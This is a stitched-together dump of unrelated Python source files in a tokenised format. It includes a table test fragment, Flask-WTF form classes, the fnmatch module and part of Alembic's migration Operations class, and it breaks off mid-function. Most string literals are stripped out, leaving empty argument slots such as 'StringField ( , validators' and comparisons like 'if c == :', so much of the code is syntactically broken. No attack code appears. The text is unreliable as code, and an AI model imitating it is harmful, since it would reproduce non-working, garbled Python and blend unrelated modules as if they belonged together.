[ , , ] , \n 
] \n 
table = cls ( table_data ) \n 
table . justify_columns = { 1 : , 2 : } \n 
\n 
expected = [ \n 
[ , , ] , \n 
[ , , ] , \n 
[ , , ] , \n 
] \n 
assert table . padded_table_data == expected \n 
~~ from flask . ext . wtf import Form \n 
from wtforms import StringField , TextAreaField , BooleanField , SelectField , SubmitField \n 
from wtforms . validators import Required , Length , Email , Regexp \n 
from wtforms import ValidationError \n 
from flask . ext . pagedown . fields import PageDownField \n 
from . . models import Role , User \n 
\n 
\n 
class NameForm ( Form ) : \n 
~~~ name = StringField ( , validators = [ Required ( ) ] ) \n 
submit = SubmitField ( ) \n 
\n 
\n 
~~ class EditProfileForm ( Form ) : \n 
~~~ name = StringField ( , validators = [ Length ( 0 , 64 ) ] ) \n 
location = StringField ( , validators = [ Length ( 0 , 64 ) ] ) \n 
about_me = TextAreaField ( ) \n 
submit = SubmitField ( ) \n 
\n 
\n 
~~ class EditProfileAdminForm ( Form ) : \n 
~~~ email = StringField ( , validators = [ Required ( ) , Length ( 1 , 64 ) , \n 
Email ( ) ] ) \n 
username = StringField ( , validators = [ \n 
Required ( ) , Length ( 1 , 64 ) , Regexp ( , 0 , \n 
\n 
) ] ) \n 
confirmed = BooleanField ( ) \n 
role = SelectField ( , coerce = int ) \n 
name = StringField ( , validators = [ Length ( 0 , 64 ) ] ) \n 
location = StringField ( , validators = [ Length ( 0 , 64 ) ] ) \n 
about_me = TextAreaField ( ) \n 
submit = SubmitField ( ) \n 
\n 
def __init__ ( self , user , * args , ** kwargs ) : \n 
~~~ super ( EditProfileAdminForm , self ) . __init__ ( * args , ** kwargs ) \n 
self . role . choices = [ ( role . id , role . name ) \n 
for role in Role . query . order_by ( Role . name ) . all ( ) ] \n 
self . user = user \n 
\n 
~~ def validate_email ( self , field ) : \n 
~~~ if field . data != self . user . email and User . query . filter_by ( email = field . data ) . first ( ) : \n 
~~~ raise ValidationError ( ) \n 
\n 
~~ ~~ def validate_username ( self , field ) : \n 
~~~ if field . data != self . user . username and User . query . filter_by ( username = field . data ) . first ( ) : \n 
~~~ raise ValidationError ( ) \n 
\n 
\n 
~~ ~~ ~~ class PostForm ( Form ) : \n 
~~~ body = PageDownField ( "What\'s on your mind?" , validators = [ Required ( ) ] ) \n 
submit = SubmitField ( ) \n 
\n 
\n 
~~ class CommentForm ( Form ) : \n 
~~~ body = StringField ( , validators = [ Required ( ) ] ) \n 
submit = SubmitField ( ) \n 
~~ """Filename matching with shell patterns.\n\nfnmatch(FILENAME, PATTERN) matches according to the local convention.\nfnmatchcase(FILENAME, PATTERN) always takes case in account.\n\nThe functions operate by translating the pattern into a regular\nexpression.  They cache the compiled regular expressions for speed.\n\nThe function translate(PATTERN) returns a regular expression\ncorresponding to PATTERN.  (It does not compile it.)\n""" \n 
\n 
import re \n 
\n 
__all__ = [ "filter" , "fnmatch" , "fnmatchcase" , "translate" ] \n 
\n 
_cache = { } \n 
_MAXCACHE = 100 \n 
\n 
def _purge ( ) : \n 
~~~ """Clear the pattern cache""" \n 
_cache . clear ( ) \n 
\n 
~~ def fnmatch ( name , pat ) : \n 
~~~ """Test whether FILENAME matches PATTERN.\n\n    Patterns are Unix shell style:\n\n    *       matches everything\n    ?       matches any single character\n    [seq]   matches any character in seq\n    [!seq]  matches any char not in seq\n\n    An initial period in FILENAME is not special.\n    Both FILENAME and PATTERN are first case-normalized\n    if the operating system requires it.\n    If you don\'t want this, use fnmatchcase(FILENAME, PATTERN).\n    """ \n 
\n 
import os \n 
name = os . path . normcase ( name ) \n 
pat = os . path . normcase ( pat ) \n 
return fnmatchcase ( name , pat ) \n 
\n 
~~ def filter ( names , pat ) : \n 
~~~ """Return the subset of the list NAMES that match PAT""" \n 
import os , posixpath \n 
result = [ ] \n 
pat = os . path . normcase ( pat ) \n 
try : \n 
~~~ re_pat = _cache [ pat ] \n 
~~ except KeyError : \n 
~~~ res = translate ( pat ) \n 
if len ( _cache ) >= _MAXCACHE : \n 
~~~ _cache . clear ( ) \n 
~~ _cache [ pat ] = re_pat = re . compile ( res ) \n 
~~ match = re_pat . match \n 
if os . path is posixpath : \n 
# normcase on posix is NOP. Optimize it away from the loop. \n 
~~~ for name in names : \n 
~~~ if match ( name ) : \n 
~~~ result . append ( name ) \n 
~~ ~~ ~~ else : \n 
~~~ for name in names : \n 
~~~ if match ( os . path . normcase ( name ) ) : \n 
~~~ result . append ( name ) \n 
~~ ~~ ~~ return result \n 
\n 
~~ def fnmatchcase ( name , pat ) : \n 
~~~ """Test whether FILENAME matches PATTERN, including case.\n\n    This is a version of fnmatch() which doesn\'t case-normalize\n    its arguments.\n    """ \n 
\n 
try : \n 
~~~ re_pat = _cache [ pat ] \n 
~~ except KeyError : \n 
~~~ res = translate ( pat ) \n 
if len ( _cache ) >= _MAXCACHE : \n 
~~~ _cache . clear ( ) \n 
~~ _cache [ pat ] = re_pat = re . compile ( res ) \n 
~~ return re_pat . match ( name ) is not None \n 
\n 
~~ def translate ( pat ) : \n 
~~~ """Translate a shell PATTERN to a regular expression.\n\n    There is no way to quote meta-characters.\n    """ \n 
\n 
i , n = 0 , len ( pat ) \n 
res = \n 
while i < n : \n 
~~~ c = pat [ i ] \n 
i = i + 1 \n 
if c == : \n 
~~~ res = res + \n 
~~ elif c == : \n 
~~~ res = res + \n 
~~ elif c == : \n 
~~~ j = i \n 
if j < n and pat [ j ] == : \n 
~~~ j = j + 1 \n 
~~ if j < n and pat [ j ] == : \n 
~~~ j = j + 1 \n 
~~ while j < n and pat [ j ] != : \n 
~~~ j = j + 1 \n 
~~ if j >= n : \n 
~~~ res = res + \n 
~~ else : \n 
~~~ stuff = pat [ i : j ] . replace ( , ) \n 
i = j + 1 \n 
if stuff [ 0 ] == : \n 
~~~ stuff = + stuff [ 1 : ] \n 
~~ elif stuff [ 0 ] == : \n 
~~~ stuff = + stuff \n 
~~ res = % ( res , stuff ) \n 
~~ ~~ else : \n 
~~~ res = res + re . escape ( c ) \n 
~~ ~~ return res + \n 
~~ from contextlib import contextmanager \n 
\n 
from sqlalchemy . types import NULLTYPE , Integer \n 
from sqlalchemy import schema as sa_schema \n 
\n 
from . import util \n 
from . compat import string_types \n 
from . ddl import impl \n 
\n 
__all__ = ( , ) \n 
\n 
class Operations ( object ) : \n 
~~~ """Define high level migration operations.\n\n    Each operation corresponds to some schema migration operation,\n    executed against a particular :class:`.MigrationContext`\n    which in turn represents connectivity to a database,\n    or a file output stream.\n\n    While :class:`.Operations` is normally configured as\n    part of the :meth:`.EnvironmentContext.run_migrations`\n    method called from an ``env.py`` script, a standalone\n    :class:`.Operations` instance can be\n    made for use cases external to regular Alembic\n    migrations by passing in a :class:`.MigrationContext`::\n\n        from alembic.migration import MigrationContext\n        from alembic.operations import Operations\n\n        conn = myengine.connect()\n        ctx = MigrationContext.configure(conn)\n        op = Operations(ctx)\n\n        op.alter_column("t", "c", nullable=True)\n\n    """ \n 
def __init__ ( self , migration_context ) : \n 
~~~ """Construct a new :class:`.Operations`\n\n        :param migration_context: a :class:`.MigrationContext`\n         instance.\n\n        """ \n 
self . migration_context = migration_context \n 
self . impl = migration_context . impl \n 
\n 
~~ @ classmethod \n 
@ contextmanager \n 
def context ( cls , migration_context ) : \n 
~~~ from . op import _install_proxy , _remove_proxy \n 
op = Operations ( migration_context ) \n 
_install_proxy ( op ) \n 
yield op \n 
_remove_proxy ( ) \n 
\n 
\n 
~~ def _primary_key_constraint ( self , name , table_name , cols , schema = None ) : \n 
~~~ m = sa_schema . MetaData ( ) \n 
columns = [ sa_schema . Column ( n , NULLTYPE ) for n in cols ] \n 
t1 = sa_schema . Table ( table_name , m , \n 
* columns , \n 
schema = schema ) \n 
p = sa_schema . PrimaryKeyConstraint ( * columns , name = name ) \n 
t1 . append_constraint ( p ) \n 
return p \n 
\n 
~~ def _foreign_key_constraint ( self , name , source , referent , \n 
local_cols , remote_cols , \n 
onupdate = None , ondelete = None , \n 
deferrable = None , source_schema = None , \n 
referent_schema = None ) : \n 
~~~ m = sa_schema . MetaData ( ) \n 
if source == referent : \n 
~~~ t1_cols = local_cols + remote_cols \n 
~~ else : \n 
~~~ t1_cols = local_cols \n 
sa_schema . Table ( referent , m , \n 
* [ sa_schema . Column ( n , NULLTYPE ) for n in remote_cols ] , \n 
schema = referent_schema ) \n 
\n 
~~ t1 = sa_schema . Table ( source , m , \n 
* [ sa_schema . Column ( n , NULLTYPE ) for n in t1_cols ] , \n 
schema = source_schema ) \n 
\n 
tname = "%s.%s" % ( referent_schema , referent ) if referent_schema else referent \n 
f = sa_schema . ForeignKeyConstraint ( local_cols , \n 
[ "%s.%s" % ( tname , n ) \n 
for n in remote_cols ] , \n 
name = name , \n 
onupdate = onupdate , \n 
ondelete = ondelete , \n 
deferrable = deferrable \n 
) \n 
t1 . append_constraint ( f ) \n 
\n 
return f \n 
\n 
~~ def _unique_constraint ( self , name , source , local_cols , schema = None , ** kw ) : \n 
~~~ t = sa_schema . Table ( source , sa_schema . MetaData ( ) , \n 
* [ sa_schema . Column ( n , NULLTYPE ) for n in local_cols ] , \n 
schema = schema ) \n 
kw [ ] = name \n 
uq = sa_schema . UniqueConstraint ( * [ t . c [ n ] for n in local_cols ] , ** kw ) \n 
# TODO: need event tests to ensure the event \n 
# is fired off here \n 
t . append_constraint ( uq ) \n 
return uq \n 
\n 
~~ def _check_constraint ( self , name , source , condition , schema = None , ** kw ) : \n 
~~~ t = sa_schema . Table ( source , sa_schema . MetaData ( ) , \n 
sa_schema . Column ( , Integer ) , schema = schema ) \n 
ck = sa_schema . CheckConstraint ( condition , name = name , ** kw ) \n 
t . append_constraint ( ck ) \n 
return ck \n 
\n 
~~ def _table ( self , name , * columns , ** kw ) : \n 
~~~ m = sa_schema . MetaData ( ) \n 
t = sa_schema . Table ( name , m , * columns , ** kw ) \n 
for f in t . foreign_keys : \n 
~~~ self . _ensure_table_for_fk ( m , f ) \n 
~~ return t \n 
\n 
~~ def _column ( self , name , type_ , ** kw ) : \n 
~~~ return sa_schema . Column ( name , type_ , ** kw ) \n 
\n 
~~ def _index ( self , name , tablename , columns , schema = None , ** kw ) : \n 
~~~ t = sa_schema . Table ( tablename or , sa_schema . MetaData ( ) , \n 
* [ sa_schema . Column ( n , NULLTYPE ) for n in columns ] , \n 
schema = schema \n 
) \n 
return sa_schema . Index ( name , * [ t . c [ n ] for n in columns ] , ** kw ) \n 
\n 
~~ def _parse_table_key ( self , table_key ) : \n 
~~~ if in table_key : \n 
~~~ tokens = table_key . split ( ) \n 
sname = "." . join ( tokens [ 0 : - 1 ] ) \n 
tname = tokens [ - 1 ] \n 
~~ else : \n 
~~~ tname = table_key \n 
sname = None \n 
~~ return ( sname , tname ) \n 
\n 
~~ def _ensure_table_for_fk ( self , metadata , fk ) : \n 
~~~ """create a placeholder Table object for the referent of a\n        ForeignKey.\n\n        """ \n 
if isinstance ( fk . _colspec , string_types ) : \n 
~~~ table_key , cname = fk . _colspec . rsplit ( , 1 ) \n 
sname , tname = self . _parse_table_key ( table_key ) \n 
if table_key not in metadata . tables : \n 
~~~ rel_t = sa_schema . Table ( tname , metadata , schema = sname ) \n 
~~ else : \n 
~~~ rel_t = metadata . tables [ table_key ] \n 
~~ if cname not in rel_t . c : \n 
~~~ rel_t . append_column ( sa_schema . Column ( cname , NULLTYPE ) ) \n 
\n 
~~ ~~ ~~ def get_context ( self ) : \n 
~~~ """Return the :class:`.MigrationContext` object that\'s\n        currently in use.\n\n        """ \n 
\n 
return self . migration_context \n 
\n 
~~ def rename_table ( self , old_table_name , new_table_name , schema = None ) : \n 
~~~ """Emit an ALTER TABLE to rename a table.\n\n        :param old_table_name: old name.\n        :param new_table_name: new name.\n        :param schema: Optional schema name to operate within.\n\n        """ \n 
self . impl . rename_table ( \n 
old_table_name , \n 
new_table_name , \n 
schema = schema \n 
) \n 
\n 
~~ @ util . _with_legacy_names ( [ ( , ) ] ) \n 
def alter_column ( self , table_name , column_name , \n 
nullable = None , \n 
server_default = False , \n 
new_column_name = None , \n 
type_ = None , \n 
autoincrement = None , \n 
existing_type = None , \n 
existing_server_default = False , \n 
existing_nullable = None , \n 
existing_autoincrement = None , \n 
schema = None \n 
) : \n 
~~~ """Issue an "alter column" instruction using the\n        current migration context.\n\n        Generally, only that aspect of the column which\n        is being changed, i.e. name, type, nullability,\n        default, needs to be specified.  Multiple changes\n        can also be specified at once and the backend should\n        "do the right thing", emitting each change either\n        separately or together as the backend allows.\n\n        MySQL has special requirements here, since MySQL\n        cannot ALTER a column without a full specification.\n        When producing MySQL-compatible migration files,\n        it is recommended that the ``existing_type``,\n        ``existing_server_default``, and ``existing_nullable``\n        parameters be present, if not being altered.\n\n        Type changes which are against the SQLAlchemy\n        "schema" types :class:`~sqlalchemy.types.Boolean`\n        and  :class:`~sqlalchemy.types.Enum` may also\n        add or drop constraints which accompany those\n        types on backends that don\'t support them natively.\n        The ``existing_server_default`` argument is\n        used in this case as well to remove a previous\n        constraint.\n\n        :param table_name: string name of the target table.\n        :param column_name: string name of the target column,\n         as it exists before the operation begins.\n        :param nullable: Optional; specify ``True`` or ``False``\n         to alter the column\'s nullability.\n        :param server_default: Optional; specify a string\n         SQL expression, :func:`~sqlalchemy.sql.expression.text`,\n         or :class:`~sqlalchemy.schema.DefaultClause` to indicate\n         an alteration to the column\'s default value.\n         Set to ``None`` to have the default removed.\n        :param new_column_name: Optional; specify a string name here to\n         indicate the new name within a column rename operation.\n\n         .. versionchanged:: 0.5.0\n            The ``name`` parameter is now named ``new_column_name``.\n            The old name will continue to function for backwards\n            compatibility.\n\n        :param ``type_``: Optional; a :class:`~sqlalchemy.types.TypeEngine`\n         type object to specify a change to the column\'s type.\n         For SQLAlchemy types that also indicate a constraint (i.e.\n         :class:`~sqlalchemy.types.Boolean`, :class:`~sqlalchemy.types.Enum`),\n         the constraint is also generated.\n        :param autoincrement: set the ``AUTO_INCREMENT`` flag of the column;\n         currently understood by the MySQL dialect.\n        :param existing_type: Optional; a\n         :class:`~sqlalchemy.types.TypeEngine`\n         type object to specify the previous type.   This\n         is required for all MySQL column alter operations that\n         don\'t otherwise specify a new type, as well as for\n         when nullability is being changed on a SQL Server\n         column.  It is also used if the type is a so-called\n         SQLlchemy "schema" type which may define a constraint (i.e.\n         :class:`~sqlalchemy.types.Boolean`,\n         :class:`~sqlalchemy.types.Enum`),\n         so that the constraint can be dropped.\n        :param existing_server_default: Optional; The existing\n         default value of the column.   Required on MySQL if\n         an existing default is not being changed; else MySQL\n         removes the default.\n        :param existing_nullable: Optional; the existing nullability\n         of the column.  Required on MySQL if the existing nullability\n         is not being changed; else MySQL sets this to NULL.\n        :param existing_autoincrement: Optional; the existing autoincrement\n         of the column.  Used for MySQL\'s system of altering a column\n         that specifies ``AUTO_INCREMENT``.\n        :param schema: Optional schema name to operate within.\n\n         .. versionadded:: 0.4.0\n\n        """ \n 
\n 
compiler = self . impl . dialect . statement_compiler ( \n 
self . impl . dialect , \n 
None \n 
) \n 
def _count_constraint ( constraint ) : \n 
~~~ return not isinstance ( constraint , sa_schema . PrimaryKeyConstraint ) and ( not constraint . _create_rule or \n 
constraint . _create_rule ( compiler ) ) \n 
\n 
~~ if existing_type and type_ : \n 
~~~ t = self . _table ( table_name , \n 
sa_schema . Column ( column_name , existing_type ) , \n 
schema = schema \n 
) \n 
for constraint in t . constraints : \n 
~~~ if _count_constraint ( constraint ) : \n 
~~~ self . impl . drop_constraint ( constraint ) \n 
\n 
~~ ~~ ~~ self . impl . alter_column ( table_name , column_name , \n 
nullable = nullable , \n 
server_default = server_default , \n 
name = new_column_name , \n 
type_ = type_ , \n 
schema = schema , \n 
autoincrement = autoincrement , \n 
existing_type = existing_type , \n 
existing_server_default = existing_server_default , \n 
existing_nullable = existing_nullable , \n 
existing_autoincrement = existing_autoincrement \n 
) \n 
\n 
if type_ : \n 
~~~ t = self . _table ( table_name , \n 
sa_schema . Column ( column_name , type_ ) , \n 
schema = schema \n 
) \n 
for constraint in t . constraints : \n 
~~~ if _count_constraint ( constraint ) : \n 
~~~ self . impl . add_constraint ( constraint ) \n 
\n 
~~ ~~ ~~ ~~ def add_column ( self , table_name , column , schema = None ) : \n 
~~~ """Issue an "add column" instruction using the current\n        migration context.\n\n        e.g.::\n\n            from alembic import op\n            from sqlalchemy import Column, String\n\n            op.add_column(\'organization\',\n                Column(\'name\', String())\n            )\n\n        The provided :class:`~sqlalchemy.schema.Column` object can also\n        specify a :class:`~sqlalchemy.schema.ForeignKey`, referencing\n        a remote table name.  Alembic will automatically generate a stub\n        "referenced" table and emit a second ALTER statement in order\n        to add the constraint separately::\n\n            from alembic import op\n            from sqlalchemy import Column, INTEGER, ForeignKey\n\n            op.add_column(\'organization\',\n                Column(\'account_id\', INTEGER, ForeignKey(\'accounts.id\'))\n            )\n\n        Note that this statement uses the :class:`~sqlalchemy.schema.Column`\n        construct as is from the SQLAlchemy library.  In particular,\n        default values to be created on the database side are\n        specified using the ``server_default`` parameter, and not\n        ``default`` which only specifies Python-side defaults::\n\n            from alembic import op\n            from sqlalchemy import Column, TIMESTAMP, func\n\n            # specify "DEFAULT NOW" along with the column add\n            op.add_column(\'account\',\n                Column(\'timestamp\', TIMESTAMP, server_default=func.now())\n            )\n\n        :param table_name: String name of the parent table.\n        :param column: a :class:`sqlalchemy.schema.Column` object\n         representing the new column.\n        :param schema: Optional schema name to operate within.\n\n         .. versionadded:: 0.4.0\n\n        """ \n 
\n 
t = self . _table ( table_name , column , schema = schema ) \n 
self . impl . add_column ( \n 
table_name , \n 
column , \n 
schema = schema \n 
) \n 
for constraint in t . constraints : \n 
~~~ if not isinstance ( constraint , sa_schema . PrimaryKeyConstraint ) : \n 
~~~ self . impl . add_constraint ( constraint ) \n 
\n 
~~ ~~ ~~ def drop_column ( self , table_name , column_name , ** kw ) : \n 
~~~ """Issue a "drop column" instruction using the current\n        migration context.\n\n        e.g.::\n\n            drop_column(\'organization\', \'account_id\')\n\n        :param table_name: name of table\n        :param column_name: name of column\n        :param schema: Optional schema name to operate within.\n\n         .. versionadded:: 0.4.0\n\n        :param mssql_drop_check: Optional boolean.  When ``True``, on\n         Microsoft SQL Server only, first\n         drop the CHECK constraint on the column using a\n         SQL-script-compatible\n         block that selects into a @variable from sys.check_constraints,\n         then exec\'s a separate DROP CONSTRAINT for that constraint.\n        :param mssql_drop_default: Optional boolean.  When ``True``, on\n         Microsoft SQL Server only, first\n         drop the DEFAULT constraint on the column using a\n         SQL-script-compatible\n         block that selects into a @variable from sys.default_constraints,\n         then exec\'s a separate DROP CONSTRAINT for that default.\n        :param mssql_drop_foreign_key: Optional boolean.  When ``True``, on\n         Microsoft SQL Server only, first\n         drop a single FOREIGN KEY constraint on the column using a\n         SQL-script-compatible\n         block that selects into a @variable from\n         sys.foreign_keys/sys.foreign_key_columns,\n         then exec\'s a separate DROP CONSTRAINT for that default.  Only\n         works if the column has exactly one FK constraint which refers to\n         it, at the moment.\n\n         .. versionadded:: 0.6.2\n\n        """ \n 
\n 
self . impl . drop_column ( \n 
table_name , \n 
self . _column ( column_name , NULLTYPE ) , \n 
** kw \n 
) \n 
\n 
\n 
~~ def create_primary_key ( self , name , table_name , cols , schema = None ) : \n 
~~~ """Issue a "create primary key" instruction using the current\n        migration context.\n\n        e.g.::\n\n            from alembic import op\n            op.create_primary_key(\n                        "pk_my_table", "my_table",\n                        ["id", "version"]\n                    )\n\n        This internally generates a :class:`~sqlalchemy.schema.Table` object\n        containing the necessary columns, then generates a new\n        :class:`~sqlalchemy.schema.PrimaryKeyConstraint`\n        object which it then associates with the :class:`~sqlalchemy.schema.Table`.\n        Any event listeners associated with this action will be fired\n        off normally.   The :class:`~sqlalchemy.schema.AddConstraint`\n        construct is ultimately used to generate the ALTER statement.\n\n        .. versionadded:: 0.5.0\n\n        :param name: Name of the primary key constraint.  The name is necessary\n         so that an ALTER statement can be emitted.  For setups that\n         use an automated naming scheme such as that described at\n         `NamingConventions <http://www.sqlalchemy.org/trac/wiki/UsageRecipes/NamingConventions>`_,\n         ``name`` here can be ``None``, as the event listener will\n         apply the name to the constraint object when it is associated\n         with the table.\n        :param table_name: String name of the target table.\n        :param cols: a list of string column names to be applied to the\n         primary key constraint.\n        :param schema: Optional schema name of the table.\n\n        """ \n 
self . impl . add_constraint ( \n 
self . _primary_key_constraint ( name , table_name , cols , \n 
schema ) \n 
) \n 
\n 
~~ def create_foreign_key ( self , name , source , referent , local_cols , \n 
remote_cols , onupdate = None , ondelete = None , \n 
deferrable = None , source_schema = None , \n 
referent_schema = None ) : \n 
~~~ """Issue a "create foreign key" instruction using the\n        current migration context.\n\n        e.g.::\n\n            from alembic import op\n            op.create_foreign_key(\n                        "fk_user_address", "address",\n                        "user", ["user_id"], ["id"])\n\n        This internally generates a :class:`~sqlalchemy.schema.Table` object\n        containing the necessary columns, then generates a new\n        :class:`~sqlalchemy.schema.ForeignKeyConstraint`\n        object which it then associates with the :class:`~sqlalchemy.schema.Table`.\n        Any event listeners associated with this action will be fired\n        off normally.   The :class:`~sqlalchemy.schema.AddConstraint`\n        construct is ultimately used to generate the ALTER statement.\n\n        :param name: Name of the foreign key constraint.  The name is necessary\n         so that an ALTER statement can be emitted.  For setups that\n         use an automated naming scheme such as that described at\n         `NamingConventions <http://www.sqlalchemy.org/trac/wiki/UsageRecipes/NamingConventions>`_,\n         ``name`` here can be ``None``, as the event listener will\n         apply the name to the constraint object when it is associated\n         with the table.\n        :param source: String name of the source table.\n        :param referent: String name of the destination table.\n        :param local_cols: a list of string column names in the\n         source table.\n        :param remote_cols: a list of string column names in the\n         remote table.\n        :param onupdate: Optional string. If set, emit ON UPDATE <value> when\n         issuing DDL for this constraint. Typical values include CASCADE,\n         DELETE and RESTRICT.\n        :param ondelete: Optional string. If set, emit ON DELETE <value> when\n         issuing DDL for this constraint. Typical values include CASCADE,\n         DELETE and RESTRICT.\n        :param deferrable: optional bool. If set, emit DEFERRABLE or NOT\n         DEFERRABLE when issuing DDL for this constraint.\n        :param source_schema: Optional schema name of the source table.\n        :param referent_schema: Optional schema name of the destination table.\n\n        """ \n 
\n 
self . impl . add_constraint ( \n 
self . _foreign_key_constraint ( name , source , referent , \n 
local_cols , remote_cols , \n 
onupdate = onupdate , ondelete = ondelete , \n 
deferrable = deferrable , source_schema = source_schema , \n 
referent_schema = referent_schema ) \n 
) \n 
\n 
~~ def create_unique_constraint ( self , name , source , local_cols , \n 
schema = None , ** kw ) : \n 
~~~ """Issue a "create unique constraint" instruction using the\n        current migration context.\n\n        e.g.::\n\n            from alembic import op\n            op.create_unique_constraint("uq_user_name", "user", ["name"])\n\n        This internally generates a :class:`~sqlalchemy.schema.Table` object\n        containing the necessary columns, then generates a new\n        :class:`~sqlalchemy.schema.UniqueConstraint`\n        object which it then associates with the :class:`~sqlalchemy.schema.Table`.\n        Any event listeners associated with this action will be fired\n        off normally.   The :class:`~sqlalchemy.schema.AddConstraint`\n        construct is ultimately used to generate the ALTER statement.\n\n        :param name: Name of the unique constraint.  The name is necessary\n         so that an ALTER statement can be emitted.  For setups that\n         use an automated naming scheme such as that described at\n         `NamingConventions <http://www.sqlalchemy.org/trac/wiki/UsageRecipes/NamingConventions>`_,\n         ``name`` here can be ``None``, as the event listener will\n         apply the name to the constraint object when it is associated\n         with the table.\n        :param source: String name of the source table. Dotted schema names are\n         supported.\n        :param local_cols: a list of string column names in the\n         source table.\n        :param deferrable: optional bool. If set, emit DEFERRABLE or NOT DEFERRABLE when\n         issuing DDL for this constraint.\n        :param initially: optional string. If set, emit INITIALLY <value> when issuing DDL\n         for this constraint.\n        :param schema: Optional schema name to operate within.\n\n         .. versionadded:: 0.4.0\n\n        """ \n 
\n 
self . impl . add_constraint ( \n 
self . _unique_constraint ( name , source , local_cols , \n 
schema = schema , ** kw ) \n 
) \n 
\n 
~~ def create_check_constraint ( self , name , source , condition , \n 
schema = None , ** kw ) : \n 
~~~ """Issue a "create check constraint" instruction using the\n        current migration context.\n\n        e.g.::\n\n            from alembic import op\n            from sqlalchemy.sql import column, func\n\n            op.create_check_constraint(\n                "ck_user_name_len",\n                "user",\n                func.len(column(\'name\')) > 5\n            )\n\n        CHECK constraints are usually against a SQL expression, so ad-hoc\n        table metadata is usually needed.   The function will convert the given\n        arguments into a :class:`sqlalchemy.schema.CheckConstraint` bound\n        to an anonymous table in order to emit the CREATE statement.\n\n        :param name: Name of the check constraint.  The name is necessary\n         so that an ALTER statement can be emitted.  For setups that\n         use an automated naming scheme such as that described at\n         `NamingConventions <http://www.sqlalchemy.org/trac/wiki/UsageRecipes/NamingConventions>`_,\n         ``name`` here can be ``None``, as the event listener will\n         apply the name to the constraint object when it is associated\n         with the table.\n        :param source: String name of the source table.\n        :param condition: SQL expression that\'s the condition of the constraint.\n         Can be a string or SQLAlchemy expression language structure.\n        :param deferrable: optional bool. If set, emit DEFERRABLE or NOT DEFERRABLE when\n         issuing DDL for this constraint.\n        :param initially: optional string. If set, emit INITIALLY <value> when issuing DDL\n         for this constraint.\n        :param schema: Optional schema name to operate within.\n\n         ..versionadded:: 0.4.0\n\n        """ \n 
self . impl . add_constraint ( \n 
self . _check_constraint ( name , source , condition , schema = schema , ** kw ) \n 
) \n 
\n 
~~ def create_table ( self , name , * columns , ** kw ) : \n 
~~~ """Issue a "create table" instruction using the current migration context.\n\n        This directive receives an argument list similar to that of the\n        traditional :class:`sqlalchemy.schema.Table` construct, but without the\n        metadata::\n\n            from sqlalchemy import INTEGER, VARCHAR, NVARCHAR, Column\n            from alembic import op\n\n            op.create_table(\n                \'account\',\n                Column(\'id\', INTEGER, primary_key=True),\n                Column(\'name\', VARCHAR(50), nullable=False),\n                Column(\'description\', NVARCHAR(200))\n                Column(\'timestamp\', TIMESTAMP, server_default=func.now())\n            )\n\n        Note that :meth:`.create_table` accepts :class:`~sqlalchemy.schema.Column`\n        constructs directly from the SQLAlchemy library.  In particular,\n        default values to be created on the database side are\n        specified using the ``server_default`` parameter, and not\n        ``default`` which only specifies Python-side defaults::\n\n            from alembic import op\n            from sqlalchemy import Column, TIMESTAMP, func\n\n            # specify "DEFAULT NOW" along with the "timestamp" column\n            op.create_table(\'account\',\n                Column(\'id\', INTEGER, primary_key=True),\n                Column(\'timestamp\', TIMESTAMP, server_default=func.now())\n            )\n\n        :param name: Name of the table\n        :param \\*columns: collection of :class:`~sqlalchemy.schema.Column`\n         objects within\n         the table, as well as optional :class:`~sqlalchemy.schema.Constraint`\n         objects\n         and :class:`~.sqlalchemy.schema.Index` objects.\n        :param schema: Optional schema name to operate within.\n        :param \\**kw: Other keyword arguments are passed to the underlying\n         :class:`sqlalchemy.schema.Table` object created for the command.\n\n        """ \n 
self . impl . create_table ( \n 
self . _table ( name , * columns , ** kw ) \n 
) \n 
\n 
~~ def drop_table ( self , name , ** kw ) : \n 
~~~ """Issue a "drop table" instruction using the current\n        migration context.\n\n\n        e.g.::\n\n            drop_table("accounts")\n\n        :param name: Name of the table\n        :param schema: Optional schema name to operate within.\n\n         .. versionadded:: 0.4.0\n\n        :param \\**kw: Other keyword arguments are passed to the underlying\n         :class:`sqlalchemy.schema.Table` object created for the command.\n\n        """ \n 
self . impl . drop_table ( \n 
self . _table ( name , ** kw ) \n 
) \n 
\n 
~~ def create_index ( self , name , table_name , columns , schema = None , ** kw ) : \n 
~~~ """Issue a "create index" instruction using the current\n        migration context.\n\n        e.g.::\n\n            from alembic import op\n            op.create_index(\'ik_test\', \'t1\', [\'foo\', \'bar\'])\n\n        :param name: name of the index.\n        :param table_name: name of the owning table.\n\n         .. versionchanged:: 0.5.0\n            The ``tablename`` parameter is now named ``table_name``.\n            As this is a positional argument, the old name is no\n            longer present.\n\n        :param columns: a list of string column names in the\n         table.\n        :param schema: Optional schema name to operate within.\n\n         .. versionadded:: 0.4.0\n\n        """ \n 
\n 
self . impl . create_index ( \n 
self . _index ( name , table_name , columns , schema = schema , ** kw ) \n 
) \n 
\n 
~~ @ util . _with_legacy_names ( [ ( , ) ] ) \n 
def drop_index ( self , name , table_name = None , schema = None ) : \n 
~~~ """Issue a "drop index" instruction using the current\n        migration context.\n\n        e.g.::\n\n            drop_index("accounts")\n\n        :param name: name of the index.\n        :param table_name: name of the owning table.  Some\n         backends such as Microsoft SQL Server require this.\n\n         .. versionchanged:: 0.5.0\n            The ``tablename`` parameter is now named ``table_name``.\n            The old name will continue to function for backwards\n            compatibility.\n\n        :param schema: Optional schema name to operate within.\n\n         .. versionadded:: 0.4.0\n\n        """ \n 
# need a dummy column name here since SQLAlchemy \n 
# 0.7.6 and further raises on Index with no columns \n 
self . impl . drop_index ( \n 
self . _index ( name , table_name , [ ] , schema = schema ) \n 
) \n 
\n 
~~ @ util . _with_legacy_names ( [ ( "type" , "type_" ) ] ) \n 
def drop_constraint ( self , name , table_name , type_ = None , schema = None ) : \n 
~~~ """Drop a constraint of the given name, typically via DROP CONSTRAINT.\n\n        :param name: name of the constraint.\n        :param table_name: table name.\n\n         .. versionchanged:: 0.5.0\n            The ``tablename`` parameter is now named ``table_name``.\n            As this is a positional argument, the old name is no\n            longer present.\n\n        :param ``type_``: optional, required on MySQL.  can be\n         \'foreignkey\', \'primary\', \'unique\', or \'check\'.\n\n         .. versionchanged:: 0.5.0\n            The ``type`` parameter is now named ``type_``.  The old name\n            ``type`` will remain for backwards compatibility.\n\n         .. versionadded:: 0.3.6 \'primary\' qualfier to enable\n            dropping of MySQL primary key constraints.\n\n        :param schema: Optional schema name to operate within.\n\n         .. versionadded:: 0.4.0\n\n        """ \n 
\n 
t = self . _table ( table_name , schema = schema ) \n 
types = { \n 
: lambda name : sa_schema . ForeignKeyConstraint ( \n 
[ ] , [ ] , name = name ) , \n 
